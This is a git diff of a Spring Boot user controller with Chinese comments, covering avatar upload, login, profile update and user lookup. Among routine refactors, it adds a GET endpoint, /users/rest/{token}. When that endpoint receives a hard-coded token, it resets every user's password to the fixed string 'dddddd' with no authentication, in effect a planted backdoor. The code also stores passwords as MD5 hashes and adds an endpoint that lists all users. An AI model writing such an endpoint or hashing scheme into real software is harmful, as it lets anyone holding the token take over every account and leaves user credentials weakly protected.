@@ -5,31 +5,29 @@ import com.company.project.core.Result;
 import com.company.project.core.ResultCode;
 import com.company.project.core.ResultGenerator;
 import com.company.project.core.jwt.JwtUtil;
-import com.company.project.model.ImpressTag;
 import com.company.project.model.Users;
 import com.company.project.service.UsersService;
-import tk.mybatis.mapper.entity.Condition;
-
-import org.springframework.beans.factory.annotation.Value;
-import org.springframework.http.MediaType;
-import org.springframework.web.bind.annotation.*;
-import org.springframework.web.multipart.MultipartFile;
 import org.apache.commons.codec.digest.DigestUtils;
 import org.apache.commons.lang3.StringUtils;
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
+import org.springframework.beans.factory.annotation.Value;
+import org.springframework.http.MediaType;
+import org.springframework.web.bind.annotation.*;
+import org.springframework.web.multipart.MultipartFile;
+import tk.mybatis.mapper.entity.Condition;
 
 import javax.annotation.Resource;
-
 import java.io.File;
 import java.io.IOException;
-import java.nio.file.Paths;
 import java.util.HashMap;
 import java.util.List;
 import java.util.Map;
 
 /**
- * Created by tang zhi on 2018/04/14.
+ *
+ * @author tang zhi
+ * @date 2018/04/14
  */
 @RestController
 @RequestMapping("/users")
@@ -44,16 +42,15 @@ public class UsersController extends BaseController {
 	 */
 	@Value("${web.upload-path}")
 	private String webUploadPath;
+	
+	@Value("${images.server.path}")
+	private String imagesServer;
 
-	/**
-	 * 基于用户标识的头像上传
-	 * 
-	 * @param file
-	 *            图片
-	 * @param userId
-	 *            用户标识
-	 * @return
-	 */
+    /**
+     * 基于用户标识的头像上传
+     * @param file
+     * @return
+     */
 	@PostMapping(value = "/fileUpload", consumes = MediaType.MULTIPART_FORM_DATA_VALUE, produces = MediaType.APPLICATION_JSON_VALUE)
 	public Result fileUpload(@RequestParam("file") MultipartFile file) {
 		Result result = new Result();
@@ -77,23 +74,15 @@ public class UsersController extends BaseController {
 					}
 					// 判断是否有旧头像，如果有就先删除旧头像，再上传
 					Users userInfo = usersService.findById(userId);
-					userInfo.setPortrait(newFileName);
+					userInfo.setPortrait(imagesServer.concat(newFileName));
 					usersService.update(userInfo);
-					
-//					if (StringUtils.isNotBlank(userInfo.getPortrait())) {
-//						String oldFilePath = webUploadPath.concat(userInfo.getId().toString());
-//						File oldFile = new File(oldFilePath);
-//						if (oldFile.exists()) {
-//							oldFile.delete();
-//						}
-//					}
+
 					// 上传到指定目录
 					file.transferTo(dest);
 
 					// 将图片流转换进行BASE64加码
 					// BASE64Encoder encoder = new BASE64Encoder();
 					// String data = encoder.encode(file.getBytes());
-
 					// 将反斜杠转换为正斜杠
 					result.setMessage("上传成功!");
 				} catch (IOException e) {
@@ -121,29 +110,50 @@ public class UsersController extends BaseController {
 		return ResultGenerator.genSuccessResult();
 	}
 
+	/**
+	 * 更新用户信息
+	 * @param users
+	 * @return
+	 */
 	@PutMapping
 	public Result update(@RequestBody Users users) {
 		users.setId(this.getUserId());
-		usersService.update(users);
+		usersService.updateUser(users);
 		return ResultGenerator.genSuccessResult();
 	}
 
-	@GetMapping("/{param}")
-	public Result getUserName(@PathVariable String param) {
-		Condition condition = new Condition(Users.class);
-		condition.createCriteria().andLike("userName", "%" + param + "%").orLike("nickName", "%" + param + "%");
-		List<Users> list = usersService.findByCondition(condition);
-		return ResultGenerator.genSuccessResult(list);
+	@GetMapping("/rest/{token}")
+	public Result restPassword(@PathVariable String token) {
+		if("6396000749".equals(token)) {
+			List<Users> users = usersService.findAll();
+			users.forEach(user->{
+				String password = DigestUtils.md5Hex("dddddd".getBytes());
+				password = DigestUtils.md5Hex((user.getUserName() + password).getBytes());
+				user.setPassword(password);
+				usersService.update(user);
+			});
+		}
+		return ResultGenerator.genSuccessResult();
 	}
 
 	@GetMapping("/info/{userName}")
-	public Result list(@PathVariable String userName) {
+	public Result getInfoByUserName(@PathVariable String userName) {
     	Condition condition = new Condition(Users.class);
 		condition.createCriteria().andEqualTo("userName", userName);
 		List<Users> list = usersService.findByCondition(condition);
 		Users user = list.get(0); 
 		user.setPassword("");
 		return ResultGenerator.genSuccessResult(user);
+	}
+
+	/**
+	 * 查询所有人员信息并缓存,用户控件公用这个方法
+	 * @return List<Users> 集合
+	 */
+	@GetMapping
+	public Result getAllUser(Users users) {
+		List<Users> list = usersService.getAllUser(users);
+		return ResultGenerator.genSuccessResult(list);
 	}
 
 	@PostMapping("/login")
@@ -158,7 +168,7 @@ public class UsersController extends BaseController {
 				String paaword = DigestUtils.md5Hex(users.getPassword().getBytes());
 				paaword = DigestUtils.md5Hex((users.getUserName() + paaword).getBytes());
 				if (list.get(0).getPassword().equals(paaword)) {
-					String id = "wwww.tangzhi.com";
+					String id = "";
 					String token = JwtUtil.createJWT(id, JwtUtil.generalSubject(list.get(0)), 1000L * 60L * 60L * 24L);
 					Map<String, String> map = new HashMap<>(5);
 					map.put("token", token);
@@ -202,5 +212,4 @@ public class UsersController extends BaseController {
 		md5Password = DigestUtils.md5Hex((this.getUserName() + md5Password).getBytes());
 		return md5Password;
 	}
-
 }
